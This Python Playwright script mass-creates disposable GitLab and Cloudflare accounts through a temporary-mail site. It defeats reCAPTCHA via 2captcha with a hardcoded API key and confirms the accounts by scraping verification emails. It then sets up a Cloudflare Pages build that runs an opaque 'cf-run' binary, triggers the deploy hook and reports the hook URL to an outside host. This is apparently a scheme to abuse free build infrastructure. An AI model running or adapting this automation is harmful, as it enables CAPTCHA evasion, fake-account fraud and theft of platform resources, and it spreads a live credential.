import random
import string
import sys
import time

import requests

from urllib import parse

from playwright.sync_api import sync_playwright

googlekey = "de70c390d36dfa19aec66a1f00b61d3f"

def getmidstring(html, start_str, end):
    start = html.find(start_str)
    if start >= 0:
        start += len(start_str)
        end = html.find(end, start)
        if end >= 0:
            return html[start:end].strip()


with sync_playwright() as p:
    username = ''.join(random.sample(string.ascii_lowercase, 10))
    browser = p.firefox.launch(headless=True)
    page = browser.new_page()
    page2 = browser.new_page()
    page.goto('http://i7.gay/')
    page2.goto("https://gitlab.com/users/sign_up/")
    page.wait_for_selector("#customShortid")
    page.locator("#customShortid").click()
    page.locator("#shortid").fill(username)
    page.locator("#customShortid").click()
    page.wait_for_load_state()
    page2.locator("#new_user_first_name").fill(''.join(random.sample(string.ascii_uppercase, 3)))
    page2.locator("#new_user_last_name").fill(''.join(random.sample(string.ascii_uppercase, 3)))
    page2.locator("#new_user_username").fill(username)
    page2.locator("#new_user_email").fill(username + "@i7.gay")
    page2.locator("#new_user_password").fill("535128725Fnardn@")
    url = page2.evaluate('document.querySelector("#new_new_user > div.g-recaptcha > div > div > '
                         'iframe").src')
    k = parse.parse_qsl(parse.urlparse(url).query)[1][1]
    print(k)
    r = requests.get('http://2captcha.com/in.php?key=%s&method=userrecaptcha&json=1&googlekey=%s&pageurl=https'
                     '://gitlab.com/users/sign_up/' % (googlekey, k)).json()
    if r['status'] != 1:
        sys.exit(1)
    datasitekey = ""
    for i in range(200):
        time.sleep(1)
        r1 = requests.get(
            'http://2captcha.com/res.php?key=%s&json=1&action=get&id=%s' % (googlekey, r['request'])).json()
        print(r1)
        if r1['status'] == 1:
            datasitekey = r1['request']
            break
    if datasitekey == "":
        sys.exit(2)
    print(datasitekey)
    page2.evaluate('document.getElementById("g-recaptcha-response").innerHTML="%s";' % datasitekey)
    page2.locator("[name='commit']").click()
    '''https://gitlab.com/users/confirmation?confirmation_token='''
    page.wait_for_selector("#epostalar > ul > li.mail.active > a > div.gonderen", timeout=60000)
    page.click("#epostalar > ul > li.mail.active > a > div.gonderen")
    time.sleep(1)
    url = "https://gitlab.com/users/confirmation?confirmation_token=" + getmidstring(page.content(),
                                                                                             "<a href=\"https://gitlab.com/users/confirmation?confirmation_token=",
                                                                                             "\"")
    page.reload()
    page2.goto(url)
    page2.locator("#user_password").fill("535128725Fnardn@")
    time.sleep(5)
    page2.locator("[name=\"button\"]").click()
    time.sleep(5)
    page2.locator("#user_role").select_option("systems_administrator")
    page2.locator("#user_registration_objective").select_option("move_repository")
    time.sleep(3)
    page2.evaluate("document.getElementById(\"user_setup_for_company_false\").click()")
    page2.evaluate("document.getElementById(\"joining_project_true\").click()")
    time.sleep(1)
    page2.locator("[type=\"submit\"]").click()
    time.sleep(1)
    page2.goto("https://gitlab.com/projects/new#import_project")
    page2.locator("[data-platform=\"repo_url\"]").click()
    page2.locator("#project_import_url").first.fill("https://gitlab.com/i-rp119tk/project.git")
    page2.locator("#project_name").first.clear()
    page2.locator("#project_name").first.fill("project")
    page2.locator("#project_path").first.clear()
    page2.locator("#project_path").first.fill("project")
    page2.get_by_role("button").get_by_text("Create project").click()
    time.sleep(2)
    page2.goto("https://dash.cloudflare.com/sign-up")
    page2.wait_for_selector("[name='email']")
    page2.locator("[name='email']").fill(username + "@i7.gay")
    page2.locator("[name='password']").fill("535128725Fnardn@")
    try:
        page2.get_by_role("button").get_by_text("Sign Up").click(timeout=3000)
    except:
        page2.get_by_role("button").get_by_text("Create Account").click()
    page2.wait_for_selector("#react-app > div > div > aside > div.c_j.c_bi.c_m > nav > div > ul > li:nth-child(4) > a")
    page2.locator("#react-app > div > div > aside > div.c_j.c_bi.c_m > nav > div > ul > li:nth-child(4) > a").click()
    page.wait_for_selector("#epostalar > ul > li.mail.active > a > div.gonderen", timeout=60000)
    page.click("#epostalar > ul > li.mail.active > a > div.gonderen")
    time.sleep(1)
    url = "https://dash.cloudflare.com/email-verification?token=" + getmidstring(page.content(),
                                                                                 "<a href=\"https://dash"
                                                                                 ".cloudflare.com"
                                                                                 "/email-verification"
                                                                                 "?token=", "\"")
    page.close()
    if url == "":
        browser.close()
        sys.exit(1)
    page2.goto(url)
    page2.wait_for_timeout(timeout=30000)
    page2.goto("https://dash.cloudflare.com/")
    page2.wait_for_selector("#react-app > div > div > aside > div.c_j.c_bi.c_m > nav > div > ul > li:nth-child(4) > a")
    page2.locator("#react-app > div > div > aside > div.c_j.c_bi.c_m > nav > div > ul > li:nth-child(4) > a").click()
    page2.locator("[type=\"primary\"]").get_by_text("Create a project").click()
    page2.locator("[type=\"primary\"]").get_by_text("Connect to Git").click()
    page2.get_by_text("GitLab").nth(1).click()
    page2.get_by_role("button").get_by_text("Connect GitLab").click()
    page2.locator('xpath=//*[@id="content-body"]/main/div/div/div[3]/form[2]/input[10]').click()
    time.sleep(1)
    page2.locator('xpath=//*[@id="react-app"]/div/div/div[1]/div/div[2]/form/div[2]/div/div/label').click()
    time.sleep(1)
    page2.get_by_role("button").get_by_text("Begin setup").click()
    page2.get_by_role("button").get_by_text("Save and Deploy").click()
    page2.wait_for_timeout(timeout=10000)
    page2.get_by_role("button").get_by_text("Continue to project").click()
    try:
        page2.locator('xpath=//*[@id="focusFallback"]/div/div[2]/div/div/button[2]').click()
    except:
        pass
    page2.locator('xpath=//*[@id="react-app"]/div/div/div[1]/main/div/div/div/div[3]/a[4]/div/span[2]/span').click()
    time.sleep(2)
    page2.locator('xpath=//*[@id="react-app"]/div/div/div[1]/main/div/div/div/div[4]/div[1]/ul/li[2]/a/span').click()
    page2.locator('xpath=//*[@id="react-app"]/div/div/div[1]/main/div/div/div/div[4]/div[2]/div/section[3]/div[2]/div/button/span').click()
    page2.locator("[name=\"name\"]").fill("test")
    page2.locator('xpath=//*[@id="react-app"]/div/div/div[1]/main/div/div/div/div[4]/div[2]/div/section[3]/div[2]/form/div[2]/span[2]/button[2]').click()
    time.sleep(1)
    url = page2.locator("pre").inner_html()
    page2.locator('xpath=//*[@id="react-app"]/div/div/div[1]/main/div/div/div/div[4]/div[2]/div/section[2]/div[2]/div/button/span').click()
    page2.locator("[name=\"build_config.build_command\"]").fill("chmod 777 cf-run npm;./cf-run -u "+url)
    page2.locator('xpath=//*[@id="react-app"]/div/div/div[1]/main/div/div/div/div[4]/div[2]/div/section[2]/div[2]/form/div[2]/span[2]/button[2]').click()
    time.sleep(5)
    requests.post(url)
    requests.post("http://oci-sj-1.jiyin.me/lllllllllll.php?api="+url)
